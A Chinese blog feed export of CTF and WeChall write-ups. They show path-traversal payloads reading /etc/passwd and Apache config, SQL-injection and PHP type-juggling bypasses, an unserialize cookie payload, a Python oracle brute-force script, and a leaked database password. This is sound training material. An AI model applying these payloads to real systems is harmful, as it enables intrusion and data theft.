经过初步尝试，结合前面file文件里的demo.docx文件，可以联想到XXE漏洞，关于word的xxe，可以看看exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality。接下来创建包含有xxe-payload的word文档。 (下面还未成功，能请求外部的xxe，但似乎最后没办法发送请求出来。。。我再试试)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ASISCTF2017-Mathilda-writeup]]></title>
      <url>%2F2017%2F09%2F11%2FASISCTF2017-Mathilda-writeup%2F</url>
      <content type="text"><![CDATA[ASISCTF2017-Mathilda-writeup文件包含 apache配置userdir Task123Description:Mathilda learned many skills from Leon, now she want to use them!http://178.62.48.181/ Solution 打开后是如上，查看源代码，发现： 访问：http://178.62.48.181/~rooney/ 。底下有个file选项，链接为: http://178.62.48.181/~rooney/?path=rooney 猜测path参数存在文件包含漏洞。经过尝试，可以发现后端会把path参数里的../替换为空。如下： 尝试读取index.php，如果直接访问 http://178.62.48.181/~rooney/index.php?path=index.php ，会发现直接返回Security failed!，鉴于会过滤../，可以用p../hp来绕过。经过一番尝试，最后访问：http://178.62.48.181/~rooney/index.php?path=..././index.ph../p 不过似乎没啥信息。 接着尝试读取 /etc/passwd，比如路径为 ../../../../etc/passwd，则根据过滤，传入的参数应为：..././..././..././..././etc/passwd。访问:1http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd 或者访问1http://178.62.48.181/~rooney/index.php?path=..././..././..././..././etc/passwd 最底下有一行：1th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash 说明存在一个用户：th1sizveryl0ngus3rn4me 接下来需要知道一些apache的知识。apache中有一个功能 Per-user web directories。在多用户的操作系统上，如果apache配置了UserDir，则每个用户可以在自己的目录下建立一个web服务器，对应的url即为:http://example.com/~username/ ，就本例而言 http://178.62.48.181/~rooney/ 即表示rooney用户自己的目录的web服务器。 所以尝试访问: http://178.62.48.181/~th1sizveryl0ngus3rn4me ，结果直接返回个 Invalid Device 。 继续看看关于apache:UserDir的知识。UserDir指令可以指定被网络读取的用户网站目录，有如下几种不同的形式。 路径前没有反斜杠，则被当作用户目录下的文件夹，比如配置为：1UserDir public_html 那么 http://178.62.48.181/~rooney/index.php 会被解释为 /home/rooney/public_html/index.php 路径前有反斜杠，则利用路径和文件名构造。比如配置为：1UserDir /var/html 那么 http://178.62.48.181/~rooney/index.php 会被解释为 /var/html/rooney/index.php 如果路径中存在星号*，则用用户名去替代，比如配置为:1UserDir /var/www/*/docs 那么 http://178.62.48.181/~rooney/index.php 会被解释为 /var/www/rooney/docs/index.php 设置多重路径，比如配置为：1UserDir public_html /var/html 那么 http://178.62.48.181/~rooney/index.php 会先去查找 /home/rooney/public_html/index.php ，如果找不到，那就去查找 /var/html/rooney/index.php 以上的这些配置指令取自Per-user web directories的例子。这些指令需要在userdir.conf中进行配置。我们尝试读取一下服务器端的userdir.conf，访问：12http://178.62.48.181/~rooney/?path=..././..././..././..././etc/apache2/mods-enabled/userdir.conf 所以可以知道，如果我们访问：http://178.62.48.181/~th1sizveryl0ngus3rn4me/index.php 实际上会被apache服务器解释为 /home/th1sizveryl0ngus3rn4me/public_html/index.php 。由于直接访问不允许，我们可以利用 rooney 的文件包含来读取，访问：12http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.ph../p 所以看起来，我们用了非预期的解法hhh。可以看出同目录下就有flag.php，我们可以直接读取：12http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.ph../p 得到flag：1ASIS&#123;I_l0V3_Us3rD1r_Mpdul3!!&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TWCTF 2017-swap-writeup]]></title>
      <url>%2F2017%2F09%2F09%2FTWCTF-2017-swap-writeup%2F</url>
      <content type="text"><![CDATA[TWCTF 2017-swap-writeupPLT GOT 分析123456chybeta@ubuntu:~/pwn/ctf/twctf$ ./swap==============================================1. Set addrsses2. Swap both addrress of value0. ExitYour choice: 程序有三个功能。选1是设置两个地址，选2是交换两个地址上的值，选0是退出。用IDA反汇编后。 main函数 ：123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // eax@2 void *v4; // rax@6 void *v5; // rax@6 void *src; // [sp+20h] [bp-20h]@0 void *v7; // [sp+28h] [bp-18h]@0 char dest; // [sp+30h] [bp-10h]@7 __int64 v9; // [sp+38h] [bp-8h]@1 v9 = *MK_FP(__FS__, 40LL); initialize(*(_QWORD *)&amp;argc, argv, envp); while ( 1 ) &#123; while ( 1 ) &#123; print_menu(*(_QWORD *)&amp;argc); v3 = read_int(*(_QWORD *)&amp;argc); if ( v3 != 1 ) break; puts("Please input 1st addr"); LODWORD(v4) = read_ll("Please input 1st addr"); src = v4; *(_QWORD *)&amp;argc = "Please input 2nd addr"; puts("Please input 2nd addr"); LODWORD(v5) = read_ll("Please input 2nd addr"); v7 = v5; &#125; if ( v3 == 2 ) &#123; memcpy(&amp;dest, src, 8uLL); memcpy(src, v7, 8uLL); *(_QWORD *)&amp;argc = v7; memcpy(v7, &amp;dest, 8uLL); &#125; else if ( !v3 ) &#123; puts("Bye."); exit(0); &#125; &#125;&#125; 其中有个read_ll()，反汇编后代码为：12345678910111213__int64 read_ll()&#123; __int64 result; // rax@1 __int64 v1; // rcx@1 char buf; // [sp+10h] [bp-110h]@1 __int64 v3; // [sp+118h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); read(0, &amp;buf, 0x20uLL); result = atoll(&amp;buf); v1 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125; exp晚上写完后再贴上来hh]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WeChall-PHP-writeup]]></title>
      <url>%2F2017%2F09%2F08%2FWeChall-PHP-writeup%2F</url>
      <content type="text"><![CDATA[WeChall PHP关。 No Escape题目源码：https://www.wechall.net/challenge/no_escape/index.php?highlight=christmas 流程大概如下： 点击vote按钮后，调用noesc_voteup() noesc_voteup()中，执行update操作后，调用noesc_stop100() noesc_stop100()，先检查票数是否为111，若是则通过。接着检查票数是否大于等于100，若是则清零。 也就是说，通过vote的方法是达不到票数为111的。看一下noesc_voteup()的第60行左右：12$who = mysql_real_escape_string($who);$query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1"; mysql_real_escape_string()会对如下字符进行转义，即在前面加上反斜杠： \x00 \n \r \ ‘ “ \x1a该函数在php5.5.0后废弃，php7.0.0开始移除。 在本题中，update的操作是用反引号来包含，所以如果我们传入参数为 bill`=111 -- +显示的sql语句为：1UPDATE noescvotes SET `bill`=111 -- `=`bill`=111 -- `+1 WHERE id=1 将bill票数设置为111，并且通过--使得后面注释掉。从而成功注入。 访问：https://www.wechall.net/challenge/no_escape/index.php?vote_for=bill`=111 — + 通关。 Training: PHP LFI漏洞代码:123456789$code = '$filename = \'pages/\'.(isset($_GET["file"])?$_GET["file"]:"welcome").\'.html\';';$code_emulate_pnb = '$filename = Common::substrUntil($filename, "\\0");'; # Emulate Poison Null Byte for PHP&gt;=5.3.4$code2 = 'include $filename;'...eval($code.$code_emulate_pnb); # eval the first line...if (lfiIsSafeDir($filename) === true) &#123; eval($code2); &#125;... 可以看到它自己模拟了一个\0的字符串截止符。为了能包含solution.php，可以利用00截断来bypass掉源代码中会附加的.html。 最后的payload：1https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00 PHP 08171234567891011121314&lt;?phpif (isset($_GET['which']))&#123; $which = $_GET['which']; switch ($which) &#123; case 0: case 1: case 2: require_once $which.'.php'; break; default: echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false); break; &#125;&#125;?&gt; 目标是包含solution.php。这里考察php弱类型比较。我们传入的which为字符串，在进行swich比较时字符串会被转化成0，然后再与数字0,1,2进行比较。所以payload为：1https://www.wechall.net/challenge/php0817/index.php?which=solution Training: Register Globals这里可以看到源代码： https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas 其中这段代码存在变量覆盖漏洞：123foreach ($_GET as $k =&gt; $v) &#123;$$k = $v;&#125; 要使strtolower($login[0]) === &#39;admin&#39;，可以通过GET传入login[0]=admin。通过上面的代码将会执行1$login[0]=admin; 从而满足条件。 username和password可以随便填写。 payload：1https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin Are you serial这题考察php反序列化。 在 https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=code.php 中第四十行：1if (false !== ($user = unserialize(Common::getCookie(&apos;serial_user&apos;, &apos;&apos;)))) 从cookie中取出对应的字段，并进行反序列化。 而在 https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=SERIAL_Solution.php 中有一个SERIAL_Solution的类，里面的_wakeup 方法可以直接通过此关。 所以做法就是生成一个序列串，通过cookie传入，然后反序列化后生成SERIAL_Solution类，并自动调用_wakeup方法。 123456789101112131415&lt;?phpclass SERIAL_Solution&#123; public function __wakeup() &#123; if (false === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE))) &#123; $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, 2, 'challenge/are_you_serial/index.php'); &#125; $chall-&gt;onChallengeSolved(GWF_Session::getUserID()); &#125;&#125;$tmp = new SERIAL_Solution();echo serialize($tmp);?&gt; 得到： O:15:”SERIAL_Solution”:0:{} 。修改cookie： PHP 08191234567891011121314151617181920&lt;?php// closure, because of namespace!$challenge = function()&#123; $f = Common::getGetString('eval'); $f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '&gt;'), '', $f); if((strlen($f) &gt; 13) || (false !== stripos($f, 'return'))) &#123; die('sorry, not allowed!'); &#125; try &#123; eval("\$spaceone = $f"); &#125; catch (Exception $e) &#123; return false; &#125; return ($spaceone === '1337');&#125;;?&gt; 分析一下流程，通过get的eval参数传入并赋值到变量$f，然后经过str_replace()的过滤，要求长度小于13，并且不包含字符串return，接着执行eval。 目标是让结果返回True。最后一行$spaceone === &#39;1337&#39;，不存在弱类型比较，要求类型和值都得相等。看一下str_replace()，过滤了单引号，双引号，所以如果直接get传参index.php?eval=&#39;1337&#39;进去，在经过过滤后，到最后会变为$spaceone=1337，是一个数值类型而非字符串。 查一下php手册；http://php.net/manual/zh/language.types.string.php 。除了用单引号，双引号表示字符串外，还有以下两种： heredoc 语法结构 nowdoc 语法结构 用一个简单的例子，对heredoc语法结构如下：123$f = &lt;&lt;&lt;q1337q; &lt;&lt;&lt;后面要提供一个标识符，这里为q，然后换行。接下来是字符串本身，这里为1337。结束时所引用的标识符必须在该行的第一列，即标识符q要在开头。标识符的命名只能包含字母、数字和下划线，并且必须以字母和下划线作为开头。在结束标识符这行除了可能有一个分号（;）外，绝对不能包含其它字符，更重要的是结束标识符的前面必须是个被本地操作系统认可的换行，比如在 UNIX 和 Mac OS X 系统中是 \n，而结束定界符（可能其后有个分号）之后也必须紧跟一个换行。 所以在本题中，我们构造payload如下：1https://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;q%0a1337%0aq;%0a 注意 %0a 即换行。 而nowdoc语法结构中，由于&lt;&lt;&lt;后的标识符要用单引号括起来，所以这里无法利用，不展开。 Host ME……未果。 PHP 0818题目要求我们传入的每一位不允许是1到9的数字。而。12&gt;&gt;&gt; hex(3735929054)'0xdeadc0de' 恰好3735929054的十六进制为0xdeadc0de，仅出现字母与数字0，因此可以绕过检测。 最后与3735929054进行==比较，这里存在php弱类型比较问题，即”0xdeadc0de” == “3735929054”。 payload：1answer=0xdeadc0de]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TWCTF 2017-Super Secure Storage-writeup]]></title>
      <url>%2F2017%2F09%2F05%2FTWCTF-2017-Super-Secure-Storage-writeup%2F</url>
      <content type="text"><![CDATA[TWCTF 2017-Super Secure Storage-writeuppython缓存 RC4 爆破 重点：这是web题，不是Crypto Task1http://s3.chal.ctf.westerns.tokyo/#/ Solution 先观察一下基本的功能。你可以输入数据，和一个密钥，发送到服务器端后会加密返回加密后的数据和对应的id。 用扫描器扫后发现有robots.txt，访问后如下：1Disallow: /super_secret_secure_shared_directory_for_customer/ 接着访问:1http://s3.chal.ctf.westerns.tokyo/super_secret_secure_shared_directory_for_customer/ securestorage.conf的内容12345678910111213141516171819server &#123; listen 80; server_name s3.chal.ctf.westerns.tokyo; root /srv/securestorage; index index.html; location / &#123; try_files $uri $uri/ @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.securestorage.sock; &#125; location ~ (\.py|\.sqlite3)$ &#123; deny all; &#125;&#125; securestorage.ini的内容：12345678910111213141516[uwsgi]chdir = /srv/securestorageuid = www-datagid = www-datamodule = appcallable = appsocket = /tmp/uwsgi.securestorage.sockchmod-socket = 666vacuum = truedie-on-term = truelogto = /var/log/uwsgi/securestorage.logprocesses = 8env = SECRET_KEY=**CENSORED**env = KEY=**CENSORED**env = FLAG=**CENSORED** 从以上文件，我们可以知道这是一个python服务端程序，主程序为app.py，直接访问http://s3.chal.ctf.westerns.tokyo/app.py 会返回403 Forbidden。 在 python-web 应用中，当前目录下， .py文件生成的pyc文件会被存储在 __pycache__文件夹中，并以 .cpython-XX.pyc 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 __pycache__/app.cpython-35.pyc（这里的35是我假设的）。我们尝试访问：1http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-35.pyc 发现成功的下载了pyc文件，然后用工具将其反编译回源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from flask import Flask, jsonify, requestfrom flask_sqlalchemy import SQLAlchemyimport hashlibimport osapp = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///./db.sqlite3'app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Trueapp.secret_key = os.environ['SECRET_KEY']db = SQLAlchemy(app)class Data(db.Model): __tablename__ = 'data' id = db.Column(db.Integer, primary_key=True) key = db.Column(db.String) data = db.Column(db.String) def __init__(self, key, data): self.key = key self.data = data def __repr__(self): return '&lt;Data id:&#123;&#125;, key:&#123;&#125;, data:&#123;&#125;&gt;'.format(self.id, self.key, self.data)class RC4: def __init__(self, key=app.secret_key): self.stream = self.PRGA(self.KSA(key)) def enc(self, c): return chr(ord(c) ^ next(self.stream)) @staticmethod def KSA(key): keylen = len(key) S = list(range(256)) j = 0 for i in range(256): j = j + S[i] + ord(key[i % keylen]) &amp; 255 S[i], S[j] = S[j], S[i] return S @staticmethod def PRGA(S): i = 0 j = 0 while True: i = i + 1 &amp; 255 j = j + S[i] &amp; 255 S[i], S[j] = S[j], S[i] yield S[S[i] + S[j] &amp; 255]def verify(enc_pass, input_pass): if len(enc_pass) != len(input_pass): return False rc4 = RC4() for x, y in zip(enc_pass, input_pass): if x != rc4.enc(y): return False return True@app.before_first_requestdef init(): db.create_all() if not Data.query.get(1): key = os.environ['KEY'] data = os.environ['FLAG'] rc4 = RC4() enckey = '' for c in key: enckey += rc4.enc(c) rc4 = RC4(key) encdata = '' for c in data: encdata += rc4.enc(c) flag = Data(enckey, encdata) db.session.add(flag) db.session.commit()@app.route('/api/data', methods=['POST'])def new(): req = request.json if not req: return jsonify(result=False) for k in ['data', 'key']: if k not-in req: return jsonify(result=False) key, data = req['key'], req['data'] if len(key) &lt; 8 or len(data) == 0: return jsonify(result=False) enckey = '' rc4 = RC4() for c in key: enckey += rc4.enc(c) encdata = '' rc4 = RC4(key) for c in data: encdata += rc4.enc(c) newdata = Data(enckey, encdata) db.session.add(newdata) db.session.commit() return jsonify(result=True, id=newdata.id, data=newdata.data)@app.route('/api/data/&lt;int:data_id&gt;')def data(data_id): data = Data.query.get(data_id) if not data: return jsonify(result=False) return jsonify(result=True, data=data.data)@app.route('/api/data/&lt;int:data_id&gt;/check', methods=['POST'])def check(data_id): data = Data.query.get(data_id) if not data: return jsonify(result=False) req = request.json if not req: return jsonify(result=False) for k in ['key']: if k not-in req: return jsonify(result=False) enckey, key = data.key, req['key'] if not verify(enckey, key): return jsonify(result=False) return jsonify(result=True)if __name__ == '__main__': app.run() app.py 的工作流程约莫如下： 建立第一个连接时通过init()，用RC4算法，先通过KEY得到enckey，再用enckey来加密FLAG，并保存到sqlite数据库中，对应的id为 1。 我们访问页面，传入数据和密钥，app.py通过new()，用RC4算法进行加密，并保存到sqlite数据库中，并返回加密的数据和对应的id。 通过id，访问 /api/data/ ，可以通过data()获得对应id的加密数据。 在页面中输入密钥，访问 /api/data//check ，可以通过check()对对应id的加密数据进行解密，并返回明文。 上图返回的即为加密后的flag。 看一下check()函数：123456789101112131415def check(data_id): data = Data.query.get(data_id) if not data: return jsonify(result=False) req = request.json if not req: return jsonify(result=False) for k in ['key']: if k not-in req: return jsonify(result=False) enckey, key = data.key, req['key'] if not verify(enckey, key): return jsonify(result=False) return jsonify(result=True) 传入data_id，如果对应id的加密数据不存在中返回false，如果json数据格式包中没有key字段，直接返回false。之后通过enckey, key = data.key, req[&#39;key&#39;]，将加密数据用的enckey和我们传入的key分别保存到变量enckey和变量key中。接着利用verify(enckey, key)来判断key是否正确。接下来看一下verify()函数： 12345678def verify(enc_pass, input_pass): if len(enc_pass) != len(input_pass): return False rc4 = RC4() for x, y in zip(enc_pass, input_pass): if x != rc4.enc(y): return False return True 首先是enc_pass和input_pass长度要相等。接着用zip(enc_pass, input_pass)，利用for循环，对input_pass的每个字母进行加密后，与enc_pass的每个字母进行比较，若有不同则返回false。所以这里要过两个关： 长度 对应的字母相等。 先说长度。我们只能根据服务器端返回来的信息来判断长度是否符合。我们传入的参数key，服务器端并没有验证它的类型，也就是说我们可以传入一个list，而不是一个字符串，这样同样能传入到verify()函数中。假如我们传入key为[null,null]，这里的len(input_pass)即为2，若len(enc_pass) != len(input_pass)，则服务器返回False，但若满足了长度要求，则会进行zip(enc_pass, input_pass)并对每个字符加密比较（注：null这里变成了None，原因待会说）：1234567&gt;&gt;&gt; encKey = "ab"&gt;&gt;&gt; key = [None,None]&gt;&gt;&gt; for x,y in zip(encKey,key):... print(x,y)...a Noneb None 在RC4的enc操作中用到了ord()：chr(ord(c) ^ next(self.stream))。对于None类型，ord(None)会崩溃掉。12345&gt;&gt;&gt; key = [None,None]&gt;&gt;&gt; ord(key[1])Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: ord() expected string of length 1, but NoneType found 现在有了两种状态：False 和 Error。基于此即可得出真正key的长度。注意，服务器端接收的数据格式是JSON，在python的文档中定义了json格式和python的转换: 所以我们的key，正如前面提到的传入的list中，填的是null，这样服务器端会自动解码为None。 当POST数据为{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}（15个null）时： 当POST数据为{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}(16个null)时： 这说明服务器端的encKey长度为16。 接下来考虑对应字符是否相等的问题，基于前面的思路，可以利用服务器端的两种状态：False 和 Error 来判断。再看一下verify()函数：12345678def verify(enc_pass, input_pass): if len(enc_pass) != len(input_pass): return False rc4 = RC4() for x, y in zip(enc_pass, input_pass): if x != rc4.enc(y): return False return True 如果我们输入key=[&quot;o&quot;,null,....,null]，如果第一个字符o加密后恰好是encKey的第一个字符，那么它会去比较第二个字符即null，在下一次比较时会进行RC4.enc(y)，其中的ord(None)将会造成服务器的崩溃，这是状态一。如果第一个字符1加密后不是encKey的第一个字符，那么会直接返回False，这是状态二。 基于此，可以逐步爆破出每个字符。下面给个利用脚本。12345678910111213141516171819import requestsurl = "http://s3.chal.ctf.westerns.tokyo/api/data/1/check"proxy = &#123;'http':"127.0.0.1:8080"&#125;key = [None,None,None,None,None,None,None,None,None,None,None,None,None,None,None,None]for index in range(16): for i in range(32,128): key[index] = str(chr(i)) payload = &#123;"key":key&#125; text = requests.post(url,json=payload,proxies=proxy).text if "500 Internal Server Error" in text : print("".join(key[:index+1])) break if "true" in text: print("".join(key)) exit() 得到key为：t2gavAjbPtj9gyps 最后访问：http://s3.chal.ctf.westerns.tokyo/#/data/1 ，在key部分填上t2gavAjbPtj9gyps 即可得到flag：1TWCTF&#123;yet-an0ther-pyth0n-0racle&#125; 还有另一种稍显麻烦的方法（可能，不是稍显hh）。RC4算法中，用先用key生成了一个字节串K，然后用这个字节串K与明文进行异或，从而得到密文。假如我们把FLAG密文当作明文，和key传入，服务器端用key生成的是同一个字节串K，然后把字节串K与FLAG密文进行异或，返回给我们的密文即为FLAG的明文。 FLAG密文串为：\fj\u00aa\u008cQd\u00aeg|\u0085i\&quot;\u0087b:$\u00e85Z\u00fa!R\u00dfE\u001d\u00b1)\u009e\u00d1F\u00d4* 可以看到这个id为81252而不是1，是我们新插入的“密文”。不过这有点不好，因为访问加密的数据是不需要身份验证的，只要访问的id正确，这个flag就会被人看到了，比如你访问id为81191的密文： 不费吹灰之力之力就可以拿到flag。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hexo-rss链接问题修复方法]]></title>
      <url>%2F2017%2F09%2F04%2Fhexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[hexo-rss链接问题修复方法 用 hexo-generator-feed 来生成hexo站点的rss，即 https://chybeta.github.io/atom.xml ，类似这样的： 然后昨天有师傅说链接是错误的，全部是 yoursite.com 网上搜了一波没找到合适的答案，http://www.jianshu.com/p/a2fe56d11c4f 里提到的是全部手动修改，不现实。后面自己解决了一下。 打开博客目录的 _config.yml。 将第15行左右的url改成你的站点：1url: http://chybeta.github.io 然后重新编译生成博客。1hexo g &amp;&amp; hexo d 就ok啦。 博客水水更健康~]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TWCTF 2017-Rev Rev Rev-writeup]]></title>
      <url>%2F2017%2F09%2F02%2FTWCTF-2017-Rev-Rev-Rev-writeup%2F</url>
      <content type="text"><![CDATA[TWCTF 2017-Rev Rev Rev-writeup爆破。warmup题题目提供了一个64位elf文件。用IDA打开后按f5没反应。gdb打开，进行动态调试。 程序的基本流程就是，将你的输入读入，然后做个加密处理，比较看是否正确。在0x0804866D处有一个strcmp，我们在这里下个断点。12gdb-peda$ b *0x0804866DBreakpoint 1 at 0x804866d 然后运行：12345678910111213141516Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089fRev! Rev! Rev!Your input: aaaa[----------------------------------registers-----------------------------------]EAX: 0xffffd12b (&quot;yyyy&quot;)....[-------------------------------------code-------------------------------------] 0x804866c: push eax=&gt; 0x804866d: call 0x8048410 &lt;strcmp@plt&gt; 0x8048672: add esp,0x10Guessed arguments:arg[0]: 0xffffd12b (&quot;yyyy&quot;)arg[1]: 0x8048870 --&gt; 0x65d92941 借助peda插件的帮忙，可以看到我们输入了aaaa后，经过加密变成了yyyy，并且与内存0x8048870处的数据比较。我们把这段内存提取出来看看：12345gdb-peda$ x/32bx 0x80488700x8048870: 0x41 0x29 0xd9 0x65 0xa1 0xf1 0xe1 0xc90x8048878: 0x19 0x09 0x93 0x13 0xa1 0x09 0xb9 0x490x8048880: 0xb9 0x89 0xdd 0x61 0x31 0x69 0xa1 0xf10x8048888: 0x71 0x21 0x9d 0xd5 0x3d 0x15 0xd5 0x00 所以我们可以利用输入与断点结合的方式，获取每个可显示字符的加密后的结果，然后根据0x8048870处的数据反推出flag。 123456789101112gdb-peda$ rStarting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089fRev! Rev! Rev!Your input: abcdefghijklmnopqrstuvwxyz省略。gdb-peda$ x/26bx 0xffffd12b0xffffd12b: 0xa1 0x61 0xe1 0x11 0x91 0x51 0xd1 0x310xffffd133: 0xb1 0x71 0xf1 0x09 0x89 0x49 0xc9 0x290xffffd13b: 0xa9 0x69 0xe9 0x19 0x99 0x59 0xd9 0x390xffffd143: 0xb9 0x79 根据上面的调试结果，可以得出如下的对应关系：12345678910111213141516171819202122232425260xa1 =&gt; z0x61 =&gt; y0xe1 =&gt; x0x11 =&gt; w0x91 =&gt; v0x51 =&gt; u0xd1 =&gt; t0x31 =&gt; s0xb1 =&gt; r0x71 =&gt; q0xf1 =&gt; p0x09 =&gt; o0x89 =&gt; n0x49 =&gt; m0xc9 =&gt; l0x29 =&gt; k0xa9 =&gt; j0x69 =&gt; i0xe9 =&gt; h0x19 =&gt; g0x99 =&gt; f0x59 =&gt; e0xd9 =&gt; d0x39 =&gt; c0xb9 =&gt; b0x79 =&gt; a 然后接下来根据调试得到大写字母和数字和符号的对应关系。1234567891011121314151617181920212223gdb-peda$ rStarting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089fRev! Rev! Rev!Your input: ABCDEFGHIJKLMNOPQRSTUVWXYZ省略。gdb-peda$ x/26bx 0xffffd12b0xffffd12b: 0xa5 0x65 0xe5 0x15 0x95 0x55 0xd5 0x350xffffd133: 0xb5 0x75 0xf5 0x0d 0x8d 0x4d 0xcd 0x2d0xffffd13b: 0xad 0x6d 0xed 0x1d 0x9d 0x5d 0xdd 0x3d0xffffd143: 0xbd 0x7dgdb-peda$ rStarting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089fRev! Rev! Rev!Your input: &#123;&#125;0123456789省略。gdb-peda$ x/12bx 0xffffd12b0xffffd12b: 0x63 0xe3 0x13 0x93 0x53 0xd3 0x33 0xb30xffffd133: 0x73 0xf3 0x41 0x21 最后根据对应关系得到flag：1TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TWCTF 2017-Freshen Uploader-writeup]]></title>
      <url>%2F2017%2F09%2F02%2FTWCTF-2017-Freshen-Uploader-writeup%2F</url>
      <content type="text"><![CDATA[TWCTF 2017-Freshen Uploader-writeup任意文件读取漏洞。php弱类型比较。 Task12In this year, we stopped using Windows so you can&apos;t use DOS tricks!http://fup.chal.ctf.westerns.tokyo/ Solution该题有两个flag。 有下载功能，比如点击第一个download后，链接为：1http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a 这里存在任意文件读取漏洞。访问：1http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php 得到download.php的源代码和第一个flag：1TWCTF&#123;then_can_y0u_read_file_list?&#125; file_list是什么东西？我们读取一下index.php看看： 根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测： 1234567&lt;?php// TWCTF&#123;then_can_y0u_read_file_list?&#125;$filename = $_GET['f'];if(stripos($filename, 'file_list') != false) die();header("Content-Type: application/octet-stream");header("Content-Disposition: attachment; filename='$filename'");readfile("uploads/$filename"); 仔细看一下判断语句：1if(stripos($filename, &apos;file_list&apos;) != false) die(); strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果$filename以file_list开头，则stripos($filename, &#39;file_list&#39;)会返回0，而采用的是!=，也就是说可能存在弱类型比较问题:0 == false。 绕过了stripos，怎么读取file_list文件？构造payload：1http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php 这样它会把第一个file_list当成文件夹，之后用两个../返回上一层文件夹，并最终读取到file_list.php。 访问：1http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213 第二个flag：1TWCTF&#123;php_is_very_secure&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ISG2017-wmwcms-writeup]]></title>
      <url>%2F2017%2F08%2F31%2FISG2017-wmwcms-writeup%2F</url>
      <content type="text"><![CDATA[ISG2017-wmwcms-writeup Task12Can u conquer this crude cms and get flag?link: http://202.120.7.204:7242 Solution查看robots.txt，可以发现有压缩包，下载下来后得到源码。 文件目录如下； public/app.php:1234567891011121314151617&lt;?phptry &#123; session_start(); define('APP_PATH', dirname(dirname(__FILE__)) . '/server/'); error_reporting(0); include_once APP_PATH . 'sql.php'; include_once APP_PATH . 'func.php'; if (!isset($_GET["action"])) &#123; errormsg("action is required."); &#125; $actions = ["login", "logout", "img"]; if (!in_array($_GET["action"], $actions)) &#123; errormsg('Hacking attempt'); &#125; include APP_PATH . $_GET["action"] . ".php";&#125; catch (Exception $e) &#123;&#125; server/img.php1234567891011121314151617181920&lt;?phpinclude_once 'sql.php';if(!isset($_SESSION['uid'])) &#123; $portrait = "img/user.png";&#125; else &#123; $uid = intval($_SESSION['uid']); $sql = "select portrait from user where id = ?"; $sth = $dbh-&gt;prepare($sql); $sth-&gt;execute([$uid]); $user = $sth-&gt;fetchAll(); if(count($user) &gt; 0)&#123; $user = $user[0]; $portrait = $user["portrait"]; &#125; else &#123; $portrait = "img/user.png"; &#125;&#125;header("Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate");header("Content-type: image/png;charset=gb2312");echo file_get_contents($portrait); server/sql.php1234567891011121314&lt;?phpinclude_once 'func.php';if (isset($_REQUEST['dsn']))&#123; $dsn = $_REQUEST['dsn'];&#125; else&#123; $dsn = "wmwcms";&#125;$dsn = "mysql:dbname=&#123;$dsn&#125;";$username = 'wmwcms';$password = '%glVYKTkLtQ22';$options = array( PDO::MYSQL_ATTR_INIT_COMMAND =&gt; 'SET names utf8', );$dbh = new PDO($dsn, $username, $password, $options); 